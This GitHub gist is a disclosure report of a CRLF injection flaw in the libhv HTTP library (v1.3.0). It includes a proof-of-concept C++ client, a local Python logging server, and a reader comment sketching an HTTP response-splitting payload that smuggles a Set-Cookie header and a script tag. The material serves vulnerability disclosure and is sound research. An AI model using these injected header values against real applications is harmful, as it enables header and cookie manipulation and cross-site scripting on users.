
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F65d136066fdd5ea4dddaadaa9b0ba90e)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F65d136066fdd5ea4dddaadaa9b0ba90e&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F65d136066fdd5ea4dddaadaa9b0ba90e) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F65d136066fdd5ea4dddaadaa9b0ba90e&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@dellalibera](https://avatars.githubusercontent.com/u/43420907?s=64&v=4)](/dellalibera)

# [dellalibera](/dellalibera)/**[01\_CRLF\_Injection\_libhv@v1.3.0.md](/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e)** Secret

Created
May 16, 2023 10:57

Show Gist options

* [Download ZIP](/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e/archive/bddd80a6c22fb9cb467768fb46345c5550f8047a.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F65d136066fdd5ea4dddaadaa9b0ba90e)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F65d136066fdd5ea4dddaadaa9b0ba90e)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e.js&quot;&gt;&lt;/script&gt;
* Save dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e to your computer and use it in GitHub Desktop.

[Code](/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e)
[Revisions
1](/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e.js&quot;&gt;&lt;/script&gt;

Save dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e to your computer and use it in GitHub Desktop.

[Download ZIP](/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e/archive/bddd80a6c22fb9cb467768fb46345c5550f8047a.zip)

CRLF Injection in libhv@v1.3.0

 [Raw](/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e/raw/bddd80a6c22fb9cb467768fb46345c5550f8047a/01_CRLF_Injection_libhv%40v1.3.0.md)

[**01\_CRLF\_Injection\_libhv@v1.3.0.md**](#file-01_crlf_injection_libhv-v1-3-0-md)

# Information

**Project:** `libhv`

**Tested Version:** `v1.3.0` (commit `579938146ff0cd99d379c038bea80d3241c5bc36`)

**Github Repository:** [`https://github.com/ithewei/libhv`](https://github.com/ithewei/libhv)

## Details

`libhv` is vulnerable to **CRLF Injection** when untrusted user input is used to set request headers. An attacker can add the `\r\n` (carriage return line feeds) characters and inject additional headers in the request sent.

References about this vulnerability and its impact:

* <https://owasp.org/www-community/vulnerabilities/CRLF_Injection>
* <https://cwe.mitre.org/data/definitions/113.html>

References to similar issues affecting other projects:

* <https://security.snyk.io/vuln/SNYK-SWIFT-SWIFTSERVERASYNCHTTPCLIENT-3237994>
* <https://security.snyk.io/vuln/SNYK-JS-UNDICI-2980276>

## Setup

Install and build the project <https://github.com/ithewei/libhv#%EF%B8%8F-build>

```
git clone https://github.com/ithewei/libhv.git
cd libhv
mkdir build
cd build
cmake ..
cmake --build .

```
## PoC

The PoC demonstrates how it's possible to add arbitrary headers.

* create and start local server to log incoming requests:

```
python3 server.py

```

* paste the `http_client_test.cpp` content under <https://github.com/ithewei/libhv/blob/master/examples/http_client_test.cpp>
* run the client

```
cmake --build .
./bin/http_client_test

```

Server logs:

```
Starting server...

GET request,
Path: /test1
Headers:
Accept: */*
Connection: keep-alive
Host: 127.0.0.1:8080
MyHeader: test
evil: hello1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36

127.0.0.1 - - [16/May/2023 12:20:28] "GET /test1 HTTP/1.1" 200 -

```
## Impact

If untrusted user input is placed in header values, a malicious user could inject additional headers. It can lead to logical errors and other misbehaviours.

## Author

Alessio Della Libera

 [Raw](/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e/raw/bddd80a6c22fb9cb467768fb46345c5550f8047a/http_client_test.cpp)

[**http\_client\_test.cpp**](#file-http_client_test-cpp)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #include "requests.h" |
| --- | --- |
|  | using namespace hv; |
|  |  |
|  | static void test\_http\_sync\_client(HttpClient\* cli) { |
|  | HttpRequest req; |
|  | req.method = HTTP\_GET; |
|  | req.url = "http://127.0.0.1:8080/test1"; |
|  | req.headers["MyHeader"] = "test\r\nevil: hello1"; |
|  |  |
|  | HttpResponse resp; |
|  | int ret = cli->send(&req, &resp); |
|  |  |
|  | if (ret != 0) { |
|  | printf("request failed!\n"); |
|  | } else { |
|  | printf("%d %s\r\n", resp.status\_code, resp.status\_message()); |
|  | printf("%s\n", resp.body.c\_str()); |
|  | } |
|  | } |
|  |  |
|  | int main(int argc, char\* argv[]) { |
|  | HttpClient sync\_client; |
|  | test\_http\_sync\_client(&sync\_client); |
|  | printf("finished!\n"); |
|  | return 0; |
|  | } |

 [Raw](/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e/raw/bddd80a6c22fb9cb467768fb46345c5550f8047a/server.py)

[**server.py**](#file-server-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | from http.server import BaseHTTPRequestHandler, HTTPServer |
| --- | --- |
|  |  |
|  | class S(BaseHTTPRequestHandler): |
|  |  |
|  | def do\_GET(self): |
|  | print(f"GET request,\nPath: {str(self.path)}\nHeaders:\n{str(self.headers)}\n") |
|  | self.send\_response(200) |
|  | self.wfile.write("hello1".encode('utf-8')) |
|  |  |
|  | if \_\_name\_\_ == '\_\_main\_\_': |
|  | server\_address = ('', 8080) |
|  | httpd = HTTPServer(server\_address, S) |
|  | print('Starting server...\n') |
|  | try: |
|  | httpd.serve\_forever() |
|  | except KeyboardInterrupt: |
|  | pass |
|  | httpd.server\_close() |
|  | print('Stopping server...\n') |

[![@xs-411](https://avatars.githubusercontent.com/u/8164861?s=80&v=4)](/xs-411)

Copy link

### **[xs-411](/xs-411)** commented [Oct 14, 2023](/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e?permalink_comment_id=4725065#gistcomment-4725065)

我为什么没有理解这会有产生什么问题？多加一个请求头，会有什么影响 吗？

Sorry, something went wrong.

[![@qycyfjy](https://avatars.githubusercontent.com/u/93075932?s=80&v=4)](/qycyfjy)

Copy link

### **[qycyfjy](/qycyfjy)** commented [Oct 14, 2023](/dellalibera/65d136066fdd5ea4dddaadaa9b0ba90e?permalink_comment_id=4725263#gistcomment-4725263) • edited Loading

> 我为什么没有理解这会有产生什么问题？多加一个请求头，会有什么影响 吗？

我的理解是: 一般不会产生什么问题, 终究还是web应用的问题, 没有对输入做验证, 举个例子:

有个url是`example.com/?last_visited_blog_id=10`, 然后服务端没有验证`last_visited_blog_id`的参数是不是个数字, 就直接在response里加了一个:

> Set-Cookie: last\_visited\_blog\_id=**等号后的参数**

的头, 这时攻击者造了一个请求`example.com/?last_visited_blog_id=10\r\nset-cookie=123\r\ncontent-type:text/html\r\n\r\n<html><scritp>alert("123")</script></html>`(为了直观这里我没有对\r\n这些转义), 假设浏览器用了libhv现在的处理方式, 那么此时浏览器收到的请求就变成了

> Set-Cookie: last\_visited\_blog\_id=10
>
> set-cookie: 123
>
> content-type:text/html
>
> `<html><script>alert("123")</script></html>`

既然能注入, 那就大有可为了.

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F65d136066fdd5ea4dddaadaa9b0ba90e)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

